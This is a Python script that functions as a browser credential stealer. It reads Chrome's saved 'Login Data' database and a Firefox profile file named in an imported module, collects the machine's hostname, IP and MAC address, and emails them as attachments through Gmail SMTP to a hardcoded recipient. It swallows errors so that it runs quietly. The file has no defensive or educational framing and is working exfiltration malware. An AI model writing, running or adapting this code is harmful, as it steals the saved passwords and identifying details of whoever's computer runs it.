import smtplib
import uuid
import socket
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import os.path
import ff
email = 'username@gmail.com'#sender mail id
password = 'pass'# sender password
send_to_email = 'recipient@gmail.com'# recipient maill address
subject = ''
message = 'here yo go'#type your dersired message here
i=0
file_location = ff.path#extract data from ff.py file
#file_location1= ff.path1
####################################################################
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
subject=subject+(f"Hostname: {hostname}")+" , "
subject=subject+(f"IP Address: {ip_address}") +" , "
subject=subject+(':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff)
for ele in range(0,8*6,8)][::-1]))
####################################################################
msg = MIMEMultipart()
msg['From'] = email
msg['To'] = send_to_email
msg['Subject'] = subject

msg.attach(MIMEText(message, 'plain'))
file_location1=os.path.expanduser('~')+"/AppData/Local/Google/Chrome/User Data/Default/Login Data"
# Setup the attachment
firefox = os.path.basename(file_location)
chrome = os.path.basename(file_location1)
#filename1 = [os.path.basename(file_location1)]
att=[chrome,firefox]
try:
	attachment = open(file_location, "rb")
	#print("syccess")
except:
	print(" ")
try:
	attachment1= open(file_location1,"rb")
except:
	print(" ")

for elements in att:
	if i==0:
	#attachment1 = open(chrome, "rb")
		try:
			part = MIMEBase('application', 'octet-stream')
			part.set_payload(attachment.read())
			encoders.encode_base64(part)
			part.add_header('Content-Disposition', "attachment; filename= %s" % firefox)
			msg.attach(part)
		except:
			i=1
	if i==1:
		try:
			parta = MIMEBase('application', 'octet-stream')
			parta.set_payload(attachment1.read())
			encoders.encode_base64(parta)
			parta.add_header('Content-Disposition', "attachment1; filename= %s" % chrome)
			msg.attach(parta)
		except:
			i=1
		i=1
#part.add_header('Content-Disposition', "attachment; filename= %s" % filename1)
# Attach the attachment to the MIMEMultipart object


server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(email, password)
text = msg.as_string()
server.sendmail(email, send_to_email, text)
#print("sent")
server.quit()
